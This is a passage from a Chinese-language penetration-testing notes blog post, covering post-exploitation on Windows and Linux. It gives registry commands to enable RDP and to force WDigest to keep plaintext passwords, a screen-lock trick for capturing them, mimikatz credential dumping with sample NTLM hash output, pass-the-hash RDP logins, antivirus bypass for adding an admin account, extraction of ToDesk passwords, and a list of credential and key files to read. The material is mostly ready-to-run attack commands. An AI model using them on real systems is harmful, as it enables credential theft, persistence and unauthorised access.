<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs cmd">开启：<br>REG ADD &quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections /t REG_DWORD /d <span class="hljs-number">00000000</span> /f<br>关闭：<br>REG ADD &quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections /t REG_DWORD /d <span class="hljs-number">11111111</span> /f<br>开启：<br>wmic RDTOGGLE WHERE ServerName=&#x27;<span class="hljs-variable">%COMPUTERNAME%</span>&#x27; <span class="hljs-keyword">call</span> SetAllowTSConnections <span class="hljs-number">1</span>`<br>REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d <span class="hljs-number">00000000</span> /f<br>REG ADD &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections /t REG_DWORD /d <span class="hljs-number">0</span> /f<br></code></pre></td></tr></table></figure>
</li>
<li><p>windows server 2008</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cmd">开启：<br>REG ADD &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; /v PortNumber /t REG_DWORD /d <span class="hljs-number">0</span>x00000d3d /f<br></code></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>有的时候使用mstsc命令远程登录时无法正常进行远程登录，这时候可以使用强制远程登录命令，具体如下：<br><code>mstsc /admin /v:ip:port</code></p>
</li>
<li><p>高版本rdp查看明文密码</p>
<ul>
<li><ol>
<li>修改注册表设置允许存储明文密码</li>
</ol>
<p><code>reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f</code></p>
</li>
<li><ol start="2">
<li>让系统强制锁屏，等待管理员重新输入账号密码后，即可抓取到明文密码。</li>
</ol>
<p><code>rundll32.exe user32.dll,LockWorkStation</code></p>
</li>
<li><ol start="3">
<li>明文读取密码</li>
</ol>
<p><code>mimikatz.exe log privilege::Debug sekurlsa::logonpasswords exit</code></p>
<p><code>type mimikatz.log | find /i &quot;password&quot;</code></p>
</li>
</ul>
</li>
<li><p>绕过火绒添加用户（管理员权限）</p>
<ul>
<li><p><code>copy c:\windows\system32\net1.exe  user.txt user.txt user user User@123 /add</code></p>
</li>
<li><p>使用api绕过工具(360+火绒)</p>
<p><code>UserAdd.exe -u user -p User@123</code></p>
</li>
</ul>
</li>
<li><p>pth登录rdp</p>
<blockquote>
<h3 id="适用系统"><a href="#适用系统" class="headerlink" title="适用系统"></a>适用系统</h3><p>Windows 8.1和Windows Server 2012 R2默认支持该功能</p>
<p>Windows 7和Windows Server 2008 R2默认不支持，需要安装补丁2871997、2973351 </p>
</blockquote>
<ul>
<li><p>前提：读取密码ntlm hash</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs cmd">mimikatz(commandline) # privilege::Debug<br>Privilege &#x27;<span class="hljs-number">20</span>&#x27; OK<br><br><br>mimikatz # sekurlsa::logonpasswords<br><br>Authentication Id : <span class="hljs-number">0</span> ; <span class="hljs-number">121408</span> (<span class="hljs-number">00000000</span>:<span class="hljs-number">0001</span>da40)<br>Session           : Interactive from <span class="hljs-number">1</span><br>User Name         : k<br>Domain            : WIN-GLK80GASVHN<br>Logon Server      : WIN-GLK80GASVHN<br>Logon <span class="hljs-built_in">Time</span>        : <span class="hljs-number">2023</span>/<span class="hljs-number">7</span>/<span class="hljs-number">18</span> <span class="hljs-number">22</span>:<span class="hljs-number">05</span>:<span class="hljs-number">39</span><br>SID               : S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">21</span>-<span class="hljs-number">1056568604</span>-<span class="hljs-number">1678046401</span>-<span class="hljs-number">925633874</span>-<span class="hljs-number">1000</span><br>	msv :	<br>	 [<span class="hljs-number">00000003</span>] Primary<br>	 * Username : k<br>	 * Domain   : WIN-GLK80GASVHN<br>	 * NTLM     : <span class="hljs-number">6</span>bc2f71a8f45391d61e6f893e270371c<br>	 * SHA1     : <span class="hljs-number">2668</span>c39830b17a736b55d60420780d3ddd34c570<br>	 [<span class="hljs-number">00010000</span>] CredentialKeys<br>	 * NTLM     : <span class="hljs-number">6</span>bc2f71a8f45391d61e6f893e270371c<br>	 * SHA1     : <span class="hljs-number">2668</span>c39830b17a736b55d60420780d3ddd34c570<br></code></pre></td></tr></table></figure>


</li>
<li><p>开启Restricted Admin mode(客户端和服务端都需要开启)</p>
<p><code>REG ADD &quot;HKLM\System\CurrentControlSet\Control\Lsa&quot; /v DisableRestrictedAdmin /t REG_DWORD /d 00000000 /f</code></p>
</li>
<li><p>本地使用mimikatz启动mstsc远程连接，不用输入密码即可登录</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs cmd">mimikatz # privilege::debug<br>Privilege &#x27;<span class="hljs-number">20</span>&#x27; OK<br><br>mimikatz # sekurlsa::pth /user:k /domain:WIN-GLK80GASVHN /ntlm:<span class="hljs-number">6</span>bc2f71a8f45391d61e6f893e270371c &quot;/run:mstsc.exe /restrictedadmin&quot;<br>user    : k<br>domain  : WIN-GLK80GASVHN<br>program : mstsc.exe /restrictedadmin<br>impers. : no<br>NTLM    : <span class="hljs-number">6</span>bc2f71a8f45391d61e6f893e270371c<br>  |  PID  <span class="hljs-number">6516</span><br>  |  TID  <span class="hljs-number">7092</span><br>  |  LSA Process is now R/W<br>  |  LUID <span class="hljs-number">0</span> ; <span class="hljs-number">11435766</span> (<span class="hljs-number">00000000</span>:<span class="hljs-number">00</span>ae7ef6)<br>  \_ msv1_0   - data <span class="hljs-built_in">copy</span> @ <span class="hljs-number">0000023</span>F09D93250 : OK !<br>  \_ kerberos - data <span class="hljs-built_in">copy</span> @ <span class="hljs-number">0000023</span>F09C64388<br>   \_ des_cbc_md4       -&gt; null<br>   \_ des_cbc_md4       OK<br>   \_ des_cbc_md4       OK<br>   \_ des_cbc_md4       OK<br>   \_ des_cbc_md4       OK<br>   \_ des_cbc_md4       OK<br>   \_ des_cbc_md4       OK<br>   \_ *Password <span class="hljs-built_in">replace</span> @ <span class="hljs-number">0000023</span>F09D8A4A8 (<span class="hljs-number">32</span>) -&gt; null<br></code></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
<h2 id="三-远控软件的使用"><a href="#三-远控软件的使用" class="headerlink" title="三.远控软件的使用"></a>三.远控软件的使用</h2><h3 id="1-todesk配置文件获取"><a href="#1-todesk配置文件获取" class="headerlink" title="1.todesk配置文件获取"></a>1.todesk配置文件获取</h3><ul>
<li><p>文件安装目录</p>
<ul>
<li>高版本系统<code>C:\Program Files\ToDesk</code></li>
<li>低版本系统<code>C:\Program Files (x86)\ToDesk</code></li>
</ul>
</li>
<li><p>配置文件<code>config.ini</code>,覆盖本地todesk配置文件即可获取密码</p>
<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">clientId</span>=识别码<br><span class="hljs-attr">tempAuthPassEx</span>=临时密码<br><span class="hljs-attr">authPassEx</span>=安全密码<br></code></pre></td></tr></table></figure></li>
</ul>
<h2 id="四-操作系统信息查找"><a href="#四-操作系统信息查找" class="headerlink" title="四.操作系统信息查找"></a>四.操作系统信息查找</h2><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs cmd">## windows<br><span class="hljs-function"></span><br><span class="hljs-function">C:\<span class="hljs-title">boot.ini</span> //查看系统版本</span><br><span class="hljs-function"><span class="hljs-title">C</span>:\<span class="hljs-title">Windows</span>\<span class="hljs-title">System32</span>\<span class="hljs-title">inetsrv</span>\<span class="hljs-title">MetaBase.xml</span> //<span class="hljs-title">IIS</span>配置文件</span><br><span class="hljs-function"><span class="hljs-title">C</span>:\<span class="hljs-title">Windows</span>\<span class="hljs-title">repair</span>\<span class="hljs-title">sam</span> //存储系统初次安装的密码</span><br><span class="hljs-function"><span class="hljs-title">C</span>:\<span class="hljs-title">Program</span> <span class="hljs-title">Files</span>\<span class="hljs-title">mysql</span>\<span class="hljs-title">my.ini</span> //<span class="hljs-title">Mysql</span>配置</span><br><span class="hljs-function"><span class="hljs-title">C</span>:\<span class="hljs-title">Program</span> <span class="hljs-title">Files</span>\<span class="hljs-title">mysql</span>\<span class="hljs-title">data</span>\<span class="hljs-title">mysql</span>\<span class="hljs-title">user.MYD</span> //<span class="hljs-title">Mysql</span> <span class="hljs-title">root</span></span><br><span class="hljs-function"><span class="hljs-title">C</span>:\<span class="hljs-title">Windows</span>\<span class="hljs-title">php.ini</span> //<span class="hljs-title">php</span>配置信息</span><br><span class="hljs-function"><span class="hljs-title">C</span>:\<span class="hljs-title">Windows</span>\<span class="hljs-title">my.ini</span> //<span class="hljs-title">Mysql</span>配置信息</span><br><span class="hljs-function"></span><br><span class="hljs-function">## <span class="hljs-title">linux</span></span><br><span class="hljs-function"></span><br><span class="hljs-function">/<span class="hljs-title">root</span>/.<span class="hljs-title">ssh</span>/<span class="hljs-title">authorized_keys</span> //如需登录到远程主机，需要到.<span class="hljs-title">ssh</span>目录下，新建<span class="hljs-title">authorized_keys</span>文件，并将<span class="hljs-title">id_rsa.pub</span>内容复制进去</span><br><span class="hljs-function">/<span class="hljs-title">root</span>/.<span class="hljs-title">ssh</span>/<span class="hljs-title">id_rsa</span> //<span class="hljs-title">ssh</span>私钥,<span class="hljs-title">ssh</span>公钥是<span class="hljs-title">id_rsa.pub</span></span><br><span class="hljs-function">/<span class="hljs-title">root</span>/.<span class="hljs-title">ssh</span>/<span class="hljs-title">id_ras.keystore</span> //记录每个访问计算机用户的公钥</span><br><span class="hljs-function">/<span class="hljs-title">root</span>/.<span class="hljs-title">ssh</span>/<span class="hljs-title">known_hosts</span></span><br><span class="hljs-function">//<span class="hljs-title">ssh</span>会把每个访问过计算机的公钥(<span class="hljs-title">public</span> <span class="hljs-title">key</span>)都记录在~/.<span class="hljs-title">ssh</span>/<span class="hljs-title">known_hosts</span>。当下次访问相同计算机时，<span class="hljs-title">OpenSSH</span>会核对公钥。如果公钥不同，<span class="hljs-title">OpenSSH</span>会发出警告， 避免你受到<span class="hljs-title">DNS</span> <span class="hljs-title">Hijack</span>之类的攻击。</span><br><span class="hljs-function">/<span class="hljs-title">etc</span>/<span class="hljs-title">passwd</span> // 账户信息</span><br><span class="hljs-function">/<span class="hljs-title">etc</span>/<span class="hljs-title">shadow</span> // 账户密码文件</span><br><span class="hljs-function">/<span class="hljs-title">etc</span>/<span class="hljs-title">my.cnf</span> //<span class="hljs-title">mysql</span> 配置文件</span><br><span class="hljs-function">/<span class="hljs-title">etc</span>/<span class="hljs-title">httpd</span>/<span class="hljs-title">conf</span>/<span class="hljs-title">httpd.conf</span> // <span class="hljs-title">Apache</span>配置文件</span><br><span class="hljs-function">/<span class="hljs-title">etc</span>/<span class="hljs-title">redhat</span>-<span class="hljs-title">release</span> 系统版本 </span><br><span class="hljs-function">/<span class="hljs-title">root</span>/.<span class="hljs-title">bash_history</span> //用户历史命令记录文件</span><br><span class="hljs-function">/<span class="hljs-title">root</span>/.<span class="hljs-title">mysql_history</span> //<span class="hljs-title">mysql</span>历史命令记录文件</span><br><span class="hljs-function">/<span class="hljs-title">var</span>/<span class="hljs-title">lib</span>/<span class="hljs-title">mlocate</span>/<span class="hljs-title">mlocate.db</span> //全文件路径</span><br><span class="hljs-function">/<span class="hljs-title">proc</span>/<span class="hljs-title">self</span>/<span class="hljs-title">fd</span>/<span class="hljs-title">fd</span>[0-9]*(文件标识符)</span><br><span class="hljs-function">/<span class="hljs-title">proc</span>/<span class="hljs-title">mounts</span> //记录系统挂载设备</span><br><span class="hljs-function">/<span class="hljs-title">porc</span>/<span class="hljs-title">config.gz</span> //内核配置文件</span><br><span class="hljs-function">/<span class="hljs-title">porc</span>/<span class="hljs-title">self</span>/<span class="hljs-title">cmdline</span> //当前进程的<span class="hljs-title">cmdline</span>参数</span><br><span class="hljs-function">/<span class="hljs-title">proc</span>/<span class="hljs-title">sched_debug</span> 配置文件可以看到当前运行的进程并可以获得对应进程的<span class="hljs-title">pid</span></span><br><span class="hljs-function">/<span class="hljs-title">proc</span>/<span class="hljs-title">pid</span>/<span class="hljs-title">cmdline</span>   则可以看到对应<span class="hljs-title">pid</span>进程的完整命令行。</span><br><span class="hljs-function">/<span class="hljs-title">proc</span>/<span class="hljs-title">net</span>/<span class="hljs-title">fib_trie</span>   内网<span class="hljs-title">IP</span></span><br><span class="hljs-function">/<span class="hljs-title">proc</span>/<span class="hljs-title">self</span>/<span class="hljs-title">environ</span>   环境变量</span><br><span class="hljs-function">/<span class="hljs-title">proc</span>/<span class="hljs-title">self</span>/<span class="hljs-title">loginuid</span>   当前用户</span><br></code></pre></td></tr></table></figure>


                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
    <div class="post-meta mr-3 d-flex align-items-center">
      <i class="iconfont icon-category"></i>
      

<span class="category-chains">
  
  
    
      <span class="category-chain">
        
  <a href="/categories/note/" class="category-chain-item">note</a>
  
  

      </span>
    
  
</span>

    </div>
  
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>tips</div>
      <div>https://k3rwin.github.io/2024/04/07/tips/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>作者</div>
          <div>k3rwin</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>发布于</div>
          <div>2024年4月7日</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>更新于</div>
          <div>2024年4月7日</div>
        </div>
      
      <div class="license-meta-item">
        <div>许可协议</div>
        <div>
          
            
            
              <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
              <span class="hint--top hint--rounded" aria-label="BY - 署名">
                <i class="iconfont icon-by"></i>
              </span>
              </a>
            
          
        </div>
      </div>
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2023/11/13/awd-note/" title="awd_note">
                        <span class="hidden-mobile">awd_note</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
  <article id="comments" lazyload>
    
  <div class="disqus" style="width:100%">
    <div id="disqus_thread"></div>
    
      <script type="text/javascript">
        var disqus_config = function() {
          this.page.url = 'https://k3rwin.github.io/2024/04/07/tips/';
          this.page.identifier = '/2024/04/07/tips/';
        };
        Fluid.utils.loadComments('#disqus_thread', function() {
          var d = document, s = d.createElement('script');
          s.src = '//' + 'k3rwin-github-io' + '.disqus.com/embed.js';
          s.setAttribute('data-timestamp', new Date());
          (d.head || d.body).appendChild(s);
        });
      </script>
    
    <noscript>Please enable JavaScript to view the comments</noscript>
  </div>


  </article>


          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  







    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> with <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
    </div>
  
  
    <div class="statistics">
  
  

  
    
      <span id="busuanzi_container_site_pv" style="display: none">
        总访问量 
        <span id="busuanzi_value_site_pv"></span>
         次
      </span>
    
    
      <span id="busuanzi_container_site_uv" style="display: none">
        总访客数 
        <span id="busuanzi_value_site_uv"></span>
         人
      </span>
    
    
  
</div>

  
  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      headingSelector : CONFIG.toc.headingSelector || 'h1,h2,h3,h4,h5,h6',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      collapseDepth   : CONFIG.toc.collapseDepth || 0,
      scrollSmooth    : true,
      headingsOffset  : -boardTop
    });
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.10/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  <script  src="/js/local-search.js" ></script>

  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>





<!-- 主题的启动项，将它保持在最底部 -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
  </noscript>
</body>
</html>
